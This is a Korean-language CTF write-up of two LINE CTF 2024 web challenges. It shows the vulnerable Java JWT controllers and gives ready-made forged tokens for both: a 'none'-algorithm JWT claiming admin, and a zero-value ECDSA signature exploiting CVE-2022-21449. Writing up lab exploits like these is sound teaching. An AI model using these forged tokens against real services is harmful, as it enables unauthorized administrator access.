---
title: "LINE CTF 2024"
date: 2024-03-26 +0900
categories: [WRITE-UP]
tags: ['writeup', 'line ctf', '2024']
image:
    path: "/assets/img/posts/linectf2024writeup/Untitled.png"
    alt: "Line CTF"
    lqip: "/assets/img/posts/linectf2024writeup/Untitled.png"
---


## jalyboy-baby [web]
- _Solver : 428_
- _Score : 100_

### 1. Abstract

- JWT None Algorithm Attack

### 2. Analysis

- 문제 페이지에서는 j 라는 파라미터를 통해 JWT 값을 전송하고 있음
- 파라미터로 전송받은 JWT 값을 파싱 및 `claims` 에 저장
- `claims` 에서 `getSubject()` 를 통해 `sub` 값을 비교하여 분기한다.
- `sub` 값이 `admin` 이라면 flag 값을 model에 포함시킨다.

```java
@Controller
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    Key secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(secretKey).compact();

        try {
            Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```
{: file="JwtController.java" }

### 3. Exploit

JWT 값은 `j` 파라미터를 통해 보내줄 수 있다. 따라서 이 JWT 값을 다시 생성해서 보낼 수 있다.

```json
{
	"alg" : "None"
}

{
	"sub" : "admin"
}
```

현재 JWT 알고리즘은 HS256을 사용하고 있지만, JWT를 생성할 수 있으므로 `alg` 를 `None` 으로 변경하여 서명 검증을 우회할 수 있다.  `sub` 가 admin이 되어 flag를 얻을 수 있다.

```plain
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

![Untitled](/assets/img/posts/linectf2024writeup/Untitled%201.png)

> Flag : `LINECTF{337e737f9f2594a02c5c752373212ef7}`
<br>

## jalyboy-jalygirl [web]
- _Solver : 189_
- _Score : 100_

### 1. Abstract

- CVE-2022-21449

### 2. Analysis

jalyboy-baby 문제와 대부분 같지만, 서명 알고리즘은 `ES256` 을 사용하고 있다. 

```java
@Controller
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    KeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(keyPair.getPrivate()).compact();

        try {
            Jws<Claims> jwt = Jwts.parser().setSigningKey(keyPair.getPublic()).parseClaimsJws(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```
{: file="JwtController.java" }


### 3. Exploit

해당 문제는 JAVA의 ESDSA 서명 검증 알고리즘에 대한 구현 오류로 인해 취약점이 발생한다. 서명 검증에 필요한 r, s 의 값이 0인지 검증을 하지 않기 때문에 0인 서명 값을 생성할 수 있고, 이를 통해 모든 공개키에 대해서 항상 유효한 서명이 된다.

```java
eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA=
```

![Untitled](/assets/img/posts/linectf2024writeup/Untitled%202.png)

> Flag: `LINECTF{abaa4d1cb9870fd25776a81bbd278932}`
> 

### Reference

> [https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/)

> [https://www.linkedin.com/pulse/elliptic-curve-digital-signature-algorithm-flaw-mohammed-janbar/](https://www.linkedin.com/pulse/elliptic-curve-digital-signature-algorithm-flaw-mohammed-janbar/)
